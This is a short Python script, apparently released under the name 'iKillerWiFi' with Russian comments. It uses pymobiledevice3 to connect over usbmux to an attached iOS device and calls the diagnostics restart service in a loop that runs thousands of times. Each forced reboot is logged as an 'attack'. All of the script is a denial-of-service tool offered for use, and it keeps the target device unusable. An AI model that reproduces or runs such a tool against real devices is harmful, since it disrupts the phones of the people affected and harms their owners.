from pymobiledevice3.lockdown import create_using_usbmux # импорт библеотек
from pymobiledevice3.services.diagnostics import DiagnosticsService # импорт библеотек
from os import system # импорт библеотек
from time import sleep # импорт библеотек
from colorama import init, Fore, Style # импорт библеотек

init() # фикс цветов (colorama)

system('title iKillerWiFi') # название для консоли

about = Fore.RED + Style.BRIGHT + """
    ██▓ ██ ▄█▀ ██▓ ██▓     ██▓    ▓█████  ██▀███      █     █░ ██▓  █████▒ ██▓
   ▓██▒ ██▄█▒ ▓██▒▓██▒    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒   ▓█░ █ ░█░▓██▒▓██   ▒ ▓██▒
   ▒██▒▓███▄░ ▒██▒▒██░    ▒██░    ▒███   ▓██ ░▄█ ▒   ▒█░ █ ░█ ▒██▒▒████ ░ ▒██▒
   ░██░▓██ █▄ ░██░▒██░    ▒██░    ▒▓█  ▄ ▒██▀▀█▄     ░█░ █ ░█ ░██░░▓█▒  ░ ░██░
   ░██░▒██▒ █▄░██░░██████▒░██████▒░▒████▒░██▓ ▒██▒   ░░██▒██▓ ░██░░▒█░    ░██░
   ░▓  ▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░   ░ ▓░▒ ▒  ░▓   ▒ ░    ░▓  
    ▒ ░░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░     ▒ ░ ░   ▒ ░ ░       ▒ ░
    ▒ ░░ ░░ ░  ▒ ░  ░ ░     ░ ░      ░     ░░   ░      ░   ░   ▒ ░ ░ ░     ▒ ░
    ░  ░  ░    ░      ░  ░    ░  ░   ░  ░   ░            ░     ░           ░  
                                                                           
           release by @kryyyaaaa (github) | @kryyaasoft (Telegram)
""" # sigma art

print(about) # выводит сигма арт

thr = int(input(' - Введите колличество атак (кол-во атак умножается на 1000) $\> ')) # запрашиваем у юзера кол-во атак
thr = thr*1000 # умнажаем на 1000
print(' Attack  |  Log') # выводим таблицу
num = 0 # номер атаки по дефолту 0
for i in range(thr): # повторяем столько раз, сколько мы умножили
	sleep(1) # ждём семь секунд
	try: # пробуем: 
		dev = create_using_usbmux() # находим девайс и канектимся к нему
		ds = DiagnosticsService(dev) # импорт диагностик сервис
		ds.restart() # перезагружаем девайс
		num = num+1 # номер атаки
		print(f' {num}         device restarted!') # логи
	except:
		num = num+1 # номер атаки
		print(f' {num}         The device is already turned off!') # логи

print('done!') # цикл завершен